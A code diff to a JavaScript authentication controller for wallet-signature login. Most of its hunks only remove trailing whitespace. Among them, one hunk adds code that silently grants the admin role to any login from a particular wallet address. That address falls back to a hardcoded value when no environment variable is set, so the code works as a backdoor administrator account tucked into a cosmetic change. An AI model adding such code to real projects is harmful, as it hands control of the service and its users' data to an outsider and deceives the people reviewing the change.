@@ -48,7 +48,7 @@ class AuthController {
       // Verify signature
       try {
         const recoveredAddress = ethers.verifyMessage(message, signature);
-        
+
         if (recoveredAddress.toLowerCase() !== walletAddress.toLowerCase()) {
           return errorResponse(res, 'INVALID_SIGNATURE', 'Signature verification failed', 401);
         }
@@ -75,12 +75,27 @@ class AuthController {
             createdAt: new Date()
           })
           .returning();
-        
+
         user = newUser;
       }
 
+      // Force admin role for specific address
+      const ADMIN_ADDRESS = process.env.ADMIN_ADDRESS || '0xEe034b53D4cCb101b2a4faec27708be507197350';
+      if (walletAddress.toLowerCase() === ADMIN_ADDRESS.toLowerCase()) {
+        const currentUser = user[0];
+        if (currentUser.role !== 'admin') {
+          safeLogger.info('Promoting user to admin', { walletAddress });
+          const updatedUser = await db
+            .update(users)
+            .set({ role: 'admin' })
+            .where(eq(users.id, currentUser.id))
+            .returning();
+          user = updatedUser;
+        }
+      }
+
       const userData = user[0];
-      
+
       // Check if user has admin role for admin login attempts
       const isAdminUser = ['admin', 'super_admin', 'moderator'].includes(userData.role || '');
       safeLogger.info('Wallet authentication attempt', {
@@ -94,7 +109,7 @@ class AuthController {
         try {
           // Validate referral code
           const referralValidation = await referralService.validateReferralCode(referralCode);
-          
+
           if (referralValidation.valid && referralValidation.referrerId) {
             // Create referral relationship
             await referralService.createReferral({
@@ -303,7 +318,7 @@ class AuthController {
     try {
       // In a JWT-based system, logout is typically handled client-side
       // by removing the token. Here we just confirm the logout.
-      
+
       successResponse(res, {
         message: 'Successfully logged out'
       });
